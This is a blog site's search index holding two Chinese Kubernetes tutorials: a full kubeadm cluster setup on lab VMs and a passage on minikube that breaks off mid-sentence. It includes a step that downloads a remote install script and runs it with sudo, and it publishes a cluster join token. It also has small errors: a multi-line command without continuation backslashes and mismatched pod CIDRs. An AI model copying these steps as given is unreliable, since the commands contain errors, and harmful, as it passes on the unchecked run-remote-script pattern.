<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>k8s学习(kubeadm)</title>
    <link href="/2025/04/28/k8s%E5%AD%A6%E4%B9%A0-kubeadm/"/>
    <url>/2025/04/28/k8s%E5%AD%A6%E4%B9%A0-kubeadm/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文来学习k8s的搭建，基于<code>kubeadm</code>，如果不会k8s的可以去看<a href="https://blog.tuyiisxp.top/2025/04/26/k8s%E5%AD%A6%E4%B9%A0(%E5%9F%BA%E4%BA%8Eminikube%E6%A8%A1%E6%8B%9F)/">k8s基础</a>,确保网络环境良好</p><p>环境：</p><table><thead><tr><th align="center">环境</th><th>主机名</th><th>ip</th></tr></thead><tbody><tr><td align="center">Ubuntu22.04 TLS</td><td>k8s-master</td><td>192.168.136.130</td></tr><tr><td align="center">Ubuntu22.04 TLS</td><td>k8s-node</td><td>192.168.136.131</td></tr></tbody></table><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><ol><li>确保每个机器的网络彼此均能相互连接</li></ol><ul><li>vm自定义适配器选择同一张网卡</li></ul><ol start="2"><li><p>确保每个节点上 MAC 地址和 product_uuid 的唯一性<br>使用命令 <code>ip link</code> 或 <code>ifconfig -a</code> 来获取网络接口的 MAC 地址<br>可以使用 <code>sudo cat /sys/class/dmi/id/product_uuid</code> 命令对 product_uuid 校验</p></li><li><p>确保6443端口开启(pod没使用其他插件)</p><p>使用命令<code>nc 127.0.0.1 6443 -zv -w 2</code>检验</p></li><li><p>关闭selinux，精简安装没有<br><code>sed -i &#39;s/enforcing/disabled/&#39; /etc/selinux/config </code> # 永久<br><code>setenforce 0</code>  # 临时</p></li><li><p>交换分区的配置</p><p>kubelet 的默认行为是在节点上检测到交换内存时无法启动。 这意味着要么禁用交换（swap）功能，要么让 kubelet 容忍交换</p><ul><li>若需允许交换分区（swap），请在 kubelet 配置文件中添加 <code>failSwapOn: false</code>，或通过命令行参数指定。 注意：即使设置了 <code>failSwapOn: false</code>，工作负载默认情况下仍无法访问交换空间。 可以通过在 kubelet 配置文件中设置 <code>swapBehavior</code> 来修改此设置。若要使用交换空间， 请设置 <code>swapBehavior</code> 的值，这个值不能是默认的 <code>NoSwap</code>。 更多细节参阅<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/#swap-memory">交换内存管理</a></li><li>要禁用交换分区（swap），可以使用命令 <code>sudo swapoff -a</code> 暂时关闭交换分区功能。 要使此更改在重启后仍然生效，请确保在系统的配置文件（如 <code>/etc/fstab</code> 或 <code>systemd.swap</code>）中禁用交换功能,Ubuntu使用<code>sudo vim /etc/fstab</code>把<code>/swapfile</code>开头的行注释掉，再重启<code>sudo reboot</code></li></ul></li><li><p>安装container runtime</p><ul><li>Kubernetes 使用<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/cri">容器运行时接口（Container Runtime Interface，CRI）</a> 来与你所选择的容器运行时交互</li><li>Docker Engine 没有实现 <a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/cri/">CRI</a>，若要使用docker需要额外安装 <a href="https://github.com/Mirantis/cri-dockerd">cri-dockerd</a>，但是它在 1.24 版本从 kubelet 中<a href="https://kubernetes.io/zh-cn/dockershim">移除</a>，可能面临很多兼容问题</li></ul></li><li><p>安装 kubeadm、kubelet 和 kubectl</p></li></ol><h2 id="安装container-runtime"><a href="#安装container-runtime" class="headerlink" title="安装container runtime"></a>安装container runtime</h2><h3 id="安装和配置先决条件及前置知识"><a href="#安装和配置先决条件及前置知识" class="headerlink" title="安装和配置先决条件及前置知识"></a>安装和配置先决条件及前置知识</h3><p>默认情况下，Linux 内核不允许 IPv4 数据包在接口之间路由。 大多数 Kubernetes 集群网络实现都会更改此设置</p><p>手动启用 IPv4 数据包转发：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 设置所需的 sysctl 参数，参数在重新启动后保持不变</span><br><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF | sudo tee /etc/sysctl.d/k8s.conf</span><br><span class="hljs-string">net.ipv4.ip_forward = 1</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-comment"># 应用 sysctl 参数而不重新启动</span><br><span class="hljs-built_in">sudo</span> sysctl --system<br></code></pre></td></tr></table></figure><p>使用以下命令验证 <code>net.ipv4.ip_forward</code> 是否设置为 1：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl net.ipv4.ip_forward<br></code></pre></td></tr></table></figure><h4 id="cgroup-驱动"><a href="#cgroup-驱动" class="headerlink" title="cgroup 驱动 "></a>cgroup 驱动<a href="https://kubernetes.io/zh-cn/docs/setup/production-environment/container-runtimes/#cgroup-drivers"> </a></h4><p><a href="https://kubernetes.io/zh-cn/docs/reference/generated/kubelet">kubelet</a> 和底层容器运行时都需要对接控制组来强制执行 <a href="https://kubernetes.io/zh-cn/docs/concepts/configuration/manage-resources-containers/">为 Pod 和容器管理资源</a> 并为诸如 CPU、内存这类资源设置请求和限制。若要对接控制组，kubelet 和容器运行时需要使用一个 <strong>cgroup 驱动</strong>。 关键的一点是 kubelet 和容器运行时需使用相同的 cgroup 驱动并且采用相同的配置。</p><p>可用的 cgroup 驱动有两个：</p><ul><li><code>cgroupfs</code></li><li><code>systemd</code></li></ul><h4 id="cgroupfs-驱动"><a href="#cgroupfs-驱动" class="headerlink" title="cgroupfs 驱动"></a>cgroupfs 驱动</h4><p><code>cgroupfs</code> 驱动是 <a href="https://kubernetes.io/zh-cn/docs/reference/config-api/kubelet-config.v1beta1">kubelet 中默认的 cgroup 驱动</a>。 当使用 <code>cgroupfs</code> 驱动时， kubelet 和容器运行时将直接对接 cgroup 文件系统来配置 cgroup。</p><p>当 <a href="https://www.freedesktop.org/wiki/Software/systemd/">systemd</a> 是初始化系统时， <strong>不</strong> 推荐使用 <code>cgroupfs</code> 驱动，因为 systemd 期望系统上只有一个 cgroup 管理器。 此外，如果你使用 <a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/cgroups">cgroup v2</a>， 则应用 <code>systemd</code> cgroup 驱动取代 <code>cgroupfs</code>。所有<code>Ubuntu</code>系统建议使用<code>systemd</code>驱动<code>cgroup</code></p><h4 id="systemd-cgroup-驱动"><a href="#systemd-cgroup-驱动" class="headerlink" title="systemd cgroup 驱动"></a>systemd cgroup 驱动</h4><p>当某个 Linux 系统发行版使用 <a href="https://www.freedesktop.org/wiki/Software/systemd/">systemd</a> 作为其初始化系统时，初始化进程会生成并使用一个 root 控制组（<code>cgroup</code>），并充当 cgroup 管理器。</p><p>systemd 与 cgroup 集成紧密，并将为每个 systemd 单元分配一个 cgroup。 因此，如果你 <code>systemd</code> 用作初始化系统，同时使用 <code>cgroupfs</code> 驱动，则系统中会存在两个不同的 cgroup 管理器。</p><p>同时存在两个 cgroup 管理器将造成系统中针对可用的资源和使用中的资源出现两个视图。某些情况下， 将 kubelet 和容器运行时配置为使用 <code>cgroupfs</code>、但为剩余的进程使用 <code>systemd</code> 的那些节点将在资源压力增大时变得不稳定。</p><p>当 systemd 是选定的初始化系统时，缓解这个不稳定问题的方法是针对 kubelet 和容器运行时将 <code>systemd</code> 用作 cgroup 驱动。</p><p>要将 <code>systemd</code> 设置为 cgroup 驱动，需编辑 <a href="https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/kubelet-config-file/"><code>KubeletConfiguration</code></a> 的 <code>cgroupDriver</code> 选项，并将其设置为 <code>systemd</code>。例如：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">kubelet.config.k8s.io/v1beta1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">KubeletConfiguration</span><br><span class="hljs-string">...</span><br><span class="hljs-attr">cgroupDriver:</span> <span class="hljs-string">systemd</span><br></code></pre></td></tr></table></figure><blockquote><p>说明：<br>从 v1.22 开始，在使用 kubeadm 创建集群时，如果用户没有在 <code>KubeletConfiguration</code> 下设置 <code>cgroupDriver</code> 字段，kubeadm 默认使用 <code>systemd</code>。</p></blockquote><p><strong>如果你将 <code>systemd</code> 配置为 kubelet 的 cgroup 驱动，你也必须将 <code>systemd</code> 配置为容器运行时的 cgroup 驱动。例如：</strong></p><ul><li>containerd</li><li>CRI-O</li></ul><p>在 Kubernetes 1.33 中，启用 <code>KubeletCgroupDriverFromCRI</code> <a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/feature-gates/">特性门控</a>结合支持 <code>RuntimeConfig</code> CRI RPC 的容器运行时，kubelet 会自动从运行时检测适当的 Cgroup 驱动程序，并忽略 kubelet 配置中的 <code>cgroupDriver</code> 设置。</p><blockquote><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p>注意：更改已加入集群的节点的 cgroup 驱动是一项敏感的操作。 如果 kubelet 已经使用某 cgroup 驱动的语义创建了 Pod，更改运行时以使用别的 cgroup 驱动，当为现有 Pod 重新创建 PodSandbox 时会产生错误。 重启 kubelet 也可能无法解决此类问题。</p><p>如果你有切实可行的自动化方案，使用其他已更新配置的节点来替换该节点， 或者使用自动化方案来重新安装。</p></blockquote><h4 id="将-kubeadm-管理的集群迁移到-systemd-驱动"><a href="#将-kubeadm-管理的集群迁移到-systemd-驱动" class="headerlink" title="将 kubeadm 管理的集群迁移到 systemd 驱动"></a>将 kubeadm 管理的集群迁移到 <code>systemd</code> 驱动</h4><p>如果你希望将现有的由 kubeadm 管理的集群迁移到 <code>systemd</code> cgroup 驱动 请按照<a href="https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/kubeadm/configure-cgroup-driver/">配置 cgroup 驱动</a>操作。</p><h4 id="CRI-版本支持"><a href="#CRI-版本支持" class="headerlink" title="CRI 版本支持"></a>CRI 版本支持</h4><p>你的容器运行时必须至少支持 v1alpha2 版本的容器运行时接口。</p><p>Kubernetes <a href="https://kubernetes.io/blog/2022/11/18/upcoming-changes-in-kubernetes-1-26/#cri-api-removal">从 1.26 版本开始</a><strong>仅适用于</strong> v1 版本的容器运行时（CRI）API。早期版本默认为 v1 版本， 但是如果容器运行时不支持 v1 版本的 API， 则 kubelet 会回退到使用（已弃用的）v1alpha2 版本的 API</p><h3 id="安装containerd-从官方二进制安装"><a href="#安装containerd-从官方二进制安装" class="headerlink" title="安装containerd(从官方二进制安装)"></a>安装containerd(从官方二进制安装)</h3><h4 id="第-1-步：安装-containerd"><a href="#第-1-步：安装-containerd" class="headerlink" title="第 1 步：安装 containerd"></a>第 1 步：安装 containerd</h4><p>从 <a href="https://github.com/containerd/containerd/releases">https://github.com/containerd/containerd/releases</a> 下载 <code>containerd-&lt;VERSION&gt;-&lt;OS&gt;-&lt;ARCH&gt;.tar.gz</code> 档案库，验证其 sha256sum，并将其解压到 <code>/usr/local</code> 目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ tar Cxzvf /usr/local containerd-1.6.2-linux-amd64.tar.gz<br>bin/<br>bin/containerd-shim-runc-v2<br>bin/containerd-shim<br>bin/ctr<br>bin/containerd-shim-runc-v1<br>bin/containerd<br>bin/containerd-stress<br></code></pre></td></tr></table></figure><p><code>containerd</code> 二进制文件是为基于 glibc 的 Linux 发行版（如 Ubuntu 和 Rocky Linux）动态构建的。此二进制文件可能不适用于基于 musl 的发行版，例如 Alpine Linux。此类发行版的用户可能必须从源或第三方软件包安装 containerd。</p><p>systemd 系统</p><p>如果您打算通过 systemd 启动 containerd，您还应该从<code>https://raw.githubusercontent.com/containerd/containerd/main/containerd.service</code>进入 <code>/usr/local/lib/systemd/system/containerd.service</code> ，然后运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://raw.githubusercontent.com/containerd/containerd/main/containerd.service<br><span class="hljs-comment">#从containerd官方仓库安装</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mv</span> containerd.service /etc/systemd/system/<br><span class="hljs-comment">#把刚才下载的服务文件移到 /etc/systemd/system/ 目录，这是系统级服务的标准安装位置</span><br><span class="hljs-built_in">sudo</span> systemctl daemon-reexec<br><span class="hljs-comment">#重执行 systemd 本身</span><br><span class="hljs-built_in">sudo</span> systemctl daemon-reload<br><span class="hljs-comment">#重新加载 systemd 的服务配置</span><br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> --now containerd<br><span class="hljs-comment">#启用并立即启动 containerd 服务</span><br><br><span class="hljs-comment">#安装完成运行检验</span><br>containerd --version<br>ctr version<br>systemctl status containerd<br></code></pre></td></tr></table></figure><h4 id="第-2-步：安装-runc"><a href="#第-2-步：安装-runc" class="headerlink" title="第 2 步：安装 runc"></a>第 2 步：安装 runc</h4><p>从 <a href="https://github.com/opencontainers/runc/releases">https://github.com/opencontainers/runc/releases</a> 下载 <code>runc.&lt;ARCH&gt;</code> 二进制文件，验证其 sha256sum，并将其安装为 <code>/usr/local/sbin/runc</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/opencontainers/runc/releases/download/v1.3.0-rc.2/runc.amd64<br><br><span class="hljs-built_in">sudo</span> install -m 755 runc.amd64 /usr/local/sbin/runc<br><span class="hljs-comment">#安装runc</span><br></code></pre></td></tr></table></figure><p>二进制文件是静态构建的，应该可以在任何 Linux 发行版上运行。</p><h4 id="第-3-步：安装-CNI-插件执行文件"><a href="#第-3-步：安装-CNI-插件执行文件" class="headerlink" title="第 3 步：安装 CNI 插件执行文件"></a>第 3 步：安装 CNI 插件执行文件</h4><p>从 <a href="https://github.com/containernetworking/plugins/releases">https://github.com/containernetworking/plugins/releases</a> 下载 <code>cni-plugins-&lt;OS&gt;-&lt;ARCH&gt;-&lt;VERSION&gt;.tgz</code> 存档，验证其 sha256sum，并将其解压到 <code>/opt/cni/bin</code> 下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/containernetworking/plugins/releases/download/v1.7.1/cni-plugins-linux-amd64-v1.7.1.tgz<br>$ <span class="hljs-built_in">mkdir</span> -p /opt/cni/bin<br>$ tar Cxzvf /opt/cni/bin cni-plugins-linux-amd64-v1.7.1.tgz<br>./<br>./macvlan<br>./static<br>./vlan<br>./portmap<br>./host-local<br>./vrf<br>./bridge<br>./tuning<br>./firewall<br>./host-device<br>./sbr<br>./loopback<br>./dhcp<br>./ptp<br>./ipvlan<br>./bandwidth<br></code></pre></td></tr></table></figure><p>二进制文件是静态构建的，应该可以在任何 Linux 发行版上运行。</p><h2 id="安装-kubeadm、kubelet-和-kubectl"><a href="#安装-kubeadm、kubelet-和-kubectl" class="headerlink" title="安装 kubeadm、kubelet 和 kubectl"></a>安装 kubeadm、kubelet 和 kubectl</h2><p>你需要在每台机器上安装以下的软件包：</p><ul><li><code>kubeadm</code>：用来初始化集群的指令。</li><li><code>kubelet</code>：在集群中的每个节点上用来启动 Pod 和容器等。</li><li><code>kubectl</code>：用来与集群通信的命令行工具。</li></ul><p>kubeadm <strong>不能</strong>帮你安装或者管理 <code>kubelet</code> 或 <code>kubectl</code>， 所以你需要确保它们与通过 kubeadm 安装的控制平面的版本相匹配。 如果不这样做，则存在发生版本偏差的风险，可能会导致一些预料之外的错误和问题。 然而，控制平面与 kubelet 之间可以存在<strong>一个</strong>次要版本的偏差，但 kubelet 的版本不可以超过 API 服务器的版本。 例如，1.7.0 版本的 kubelet 可以完全兼容 1.8.0 版本的 API 服务器，反之则不可以。</p><blockquote><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><p>每个 Kubernetes 小版本都有一个专用的软件包仓库。 如果你想安装 1.33 以外的次要版本，请参阅所需次要版本的安装指南。</p></blockquote><p>以下指令适用于 Kubernetes 1.33.</p><ol><li><p>更新 <code>apt</code> 包索引并安装使用 Kubernetes <code>apt</code> 仓库所需要的包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br><span class="hljs-meta prompt_"># </span><span class="language-bash">apt-transport-https 可能是一个虚拟包（dummy package）；如果是的话，你可以跳过安装这个包</span><br>sudo apt-get install -y apt-transport-https ca-certificates curl gpg<br></code></pre></td></tr></table></figure></li><li><p>下载用于 Kubernetes 软件包仓库的公共签名密钥。所有仓库都使用相同的签名密钥，因此你可以忽略URL中的版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">如果 `/etc/apt/keyrings` 目录不存在，则应在 curl 命令之前创建它，请阅读下面的注释。</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p -m 755 /etc/apt/keyrings</span><br>curl -fsSL https://pkgs.k8s.io/core:/stable:/v1.33/deb/Release.key | sudo gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>说明：</p><p>在低于 Debian 12 和 Ubuntu 22.04 的发行版本中，<code>/etc/apt/keyrings</code> 默认不存在。 应在 curl 命令之前创建它。</p></blockquote><ol><li><p>添加 Kubernetes <code>apt</code> 仓库。 请注意，此仓库仅包含适用于 Kubernetes 1.33 的软件包； 对于其他 Kubernetes 次要版本，则需要更改 URL 中的 Kubernetes 次要版本以匹配你所需的次要版本 （你还应该检查正在阅读的安装文档是否为你计划安装的 Kubernetes 版本的文档）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">此操作会覆盖 /etc/apt/sources.list.d/kubernetes.list 中现存的所有配置。(按需求更换国内镜像)</span><br>echo &#x27;deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://pkgs.k8s.io/core:/stable:/v1.33/deb/ /&#x27; | sudo tee /etc/apt/sources.list.d/kubernetes.list<br></code></pre></td></tr></table></figure></li><li><p>更新 <code>apt</code> 包索引，安装 kubelet、kubeadm 和 kubectl，并锁定其版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br>sudo apt-get install -y kubelet kubeadm kubectl<br>sudo apt-mark hold kubelet kubeadm kubectl<br></code></pre></td></tr></table></figure></li></ol><p>kubelet 现在每隔几秒就会重启，因为它陷入了一个等待 kubeadm 指令的死循环，这不用关系</p><h2 id="配置-cgroup-驱动程序"><a href="#配置-cgroup-驱动程序" class="headerlink" title="配置 cgroup 驱动程序"></a>配置 cgroup 驱动程序</h2><p>由于 kubeadm 把 kubelet 视为一个 <a href="https://kubernetes.io/zh-cn/docs/setup/production-environment/tools/kubeadm/kubelet-integration">系统服务</a>来管理， 所以对基于 kubeadm 的安装， 我们推荐使用 <code>systemd</code> 驱动， 不推荐 kubelet <a href="https://kubernetes.io/zh-cn/docs/reference/config-api/kubelet-config.v1beta1">默认</a>的 <code>cgroupfs</code> 驱动</p><p><strong>由于我们使用的是二进制安装不会生成config.toml</strong></p><p>我们运行生成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p /etc/containerd<br>containerd config default | <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">tee</span> /etc/containerd/config.toml<br></code></pre></td></tr></table></figure><h3 id="配置-kubelet-的-cgroup-驱动"><a href="#配置-kubelet-的-cgroup-驱动" class="headerlink" title="配置 kubelet 的 cgroup 驱动"></a><strong>配置 kubelet 的 cgroup 驱动</strong></h3><p>kubeadm 支持在执行 <code>kubeadm init</code> 时，传递一个 <code>KubeletConfiguration</code> 结构体。 <code>KubeletConfiguration</code> 包含 <code>cgroupDriver</code> 字段，可用于控制 kubelet 的 cgroup 驱动</p><p><strong>说明：</strong></p><p>在版本 1.22 及更高版本中，如果用户没有在 <code>KubeletConfiguration</code> 中设置 <code>cgroupDriver</code> 字段， <code>kubeadm</code> 会将它设置为默认值 <code>systemd</code>。</p><p>在 Kubernetes v1.28 中，你可以以 Alpha 功能启用 cgroup 驱动的自动检测。 有关更多详情，请查看 <a href="https://kubernetes.io/zh-cn/docs/setup/production-environment/container-runtimes/#systemd-cgroup-driver">systemd cgroup 驱动</a>。</p><p>运行:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubelet --version<br></code></pre></td></tr></table></figure><p>看到我们的版本是<code>1.33</code>的</p><h1 id="使用-kubeadm-创建集群"><a href="#使用-kubeadm-创建集群" class="headerlink" title="使用 kubeadm 创建集群"></a>使用 kubeadm 创建集群</h1><p>我们运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> kubeadm init --apiserver-advertise-address=192.168.136.130 <br>--kubernetes-version v1.33.0 <br>--service-cidr=10.92.0.0/12 <br>--pod-network-cidr=10.220.0.0/16<br>--image-repository registry.aliyuncs.com/google_containers<br></code></pre></td></tr></table></figure><p>来初始化平台</p><p>安装 Pod 网络附加组件(采用calico或者选择<strong>Flannel</strong> 和<strong>Cilium</strong>)</p><ol><li><p>下载 Calico 清单文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://docs.projectcalico.org/manifests/calico.yaml <br></code></pre></td></tr></table></figure></li><li><p><strong>修改 CIDR 配置</strong><br>在 YAML 文件中找到 <code>192.168.0.0/16</code>（约 625 行），替换为初始化时 <code>kubeadm init --pod-network-cidr=10.10.0.0/16</code> 指定的 CIDR 段</p></li><li><p>部署网络插件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f calico.yaml<br></code></pre></td></tr></table></figure></li></ol><p>执行<code>init</code>成功后会输出node加入master的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> kubeadm <span class="hljs-built_in">join</span> 192.168.136.130:6443 \<br>  --token 1sdami.5bq3wmthsjkxp4mh \<br>  --discovery-token-ca-cert-hash sha256:f8c244aee84f3436faad40ab8086f7b2ee27b86a5877c8f36abcb8ca6fdae009<br></code></pre></td></tr></table></figure><p>我们再node节点运行改命令加入节点</p><p>节点加入后我们就要查看，但是<code>kubectl</code>有限制</p><p>要使非 root 用户可以运行<code> kubectl</code>，请运行以下命令， 它们也是 <code>kubeadm init</code> 输出的一部分：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.kube<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="hljs-variable">$HOME</span>/.kube/config<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> $(<span class="hljs-built_in">id</span> -u):$(<span class="hljs-built_in">id</span> -g) <span class="hljs-variable">$HOME</span>/.kube/config<br></code></pre></td></tr></table></figure><p>或者，如果你是 <code>root</code> 用户，则可以运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> KUBECONFIG=/etc/kubernetes/admin.conf<br></code></pre></td></tr></table></figure><p>然后运行<code>kubectl get nodes</code>就可以看到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ kubectl get nodes <br>NAME         STATUS   ROLES           AGE     VERSION<br>k8s-master   Ready    control-plane   18m     v1.33.0<br>k8s-node1    Ready    &lt;none&gt;          2m37s   v1.33.0<br></code></pre></td></tr></table></figure><h1 id="运用"><a href="#运用" class="headerlink" title="运用"></a>运用</h1><p>给自己挖坑🤓</p>]]></content>
    
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>k8s学习(基于minikube模拟)</title>
    <link href="/2025/04/26/k8s%E5%AD%A6%E4%B9%A0(%E5%9F%BA%E4%BA%8Eminikube%E6%A8%A1%E6%8B%9F)/"/>
    <url>/2025/04/26/k8s%E5%AD%A6%E4%B9%A0(%E5%9F%BA%E4%BA%8Eminikube%E6%A8%A1%E6%8B%9F)/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近机缘巧合下对于云原生比较感兴趣，本文使用<code>minikube</code>模拟k8s集群，使用<code>kubectl</code>管理集群</p><p>环境是<code>Ubuntu22.04 TLS</code></p><p>ps:本文转载自<a href="https://guangzhengli.com/courses/kubernetes">https://guangzhengli.com/courses/kubernetes</a> ，只是作为个人学习</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装<code>docker</code></h2><p>使用官方安装脚本自动安装:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL https://test.docker.com -o test-docker.sh<br><span class="hljs-built_in">sudo</span> sh test-docker.sh<br></code></pre></td></tr></table></figure><p>由于minikube的docker引擎不能是root权限，所有我们将普通用户加入docker用户组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> usermod -aG docker <span class="hljs-variable">$USER</span><br></code></pre></td></tr></table></figure><h2 id="安装minikube"><a href="#安装minikube" class="headerlink" title="安装minikube"></a>安装<code>minikube</code></h2><p>我们使用 **<a href="https://minikube.sigs.k8s.io/docs/start/?arch=/linux/x86-64/stable/debian+package">Debian 软件包</a>**安装最新版的最新的 minikube <strong>稳定</strong>版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube_latest_amd64.deb<br><span class="hljs-built_in">sudo</span> dpkg -i minikube_latest_amd64.deb<br></code></pre></td></tr></table></figure><h2 id="启动minikube"><a href="#启动minikube" class="headerlink" title="启动minikube"></a>启动<code>minikube</code></h2><p>我们使用<code>minikube start</code>回启动一个单节点的 Kubernetes 集群</p><p><code>minikube start</code>参数解释:</p><blockquote><p><code>--driver=&lt;driver&gt;</code>：指定使用的驱动程序，如 <code>docker</code>、<code>virtualbox</code>、<code>hyperv</code> 等,不指定会自动识别。</p><p><code>--kubernetes-version=&lt;version&gt;</code>：指定 Kubernetes 的版本，不指定会自动识别。</p><p><code>--memory=&lt;MB&gt;</code> 和 <code>--cpus=&lt;num&gt;</code>：分配给集群的内存和 CPU 核心数，默认是2200mb和2核。</p><p><code>--image-repository=&lt;url&gt;</code>：指定镜像仓库地址，适用于网络受限的环境。建议更换国内节点</p><p><code>--container-runtime=&lt;runtime&gt;</code>：选择容器运行时，如 <code>docker</code>、<code>containerd</code> 或 <code>cri-o</code>不指定会自动识别 </p><p><code>--extra-config=&lt;component.key=value&gt;</code>：为 Kubernetes 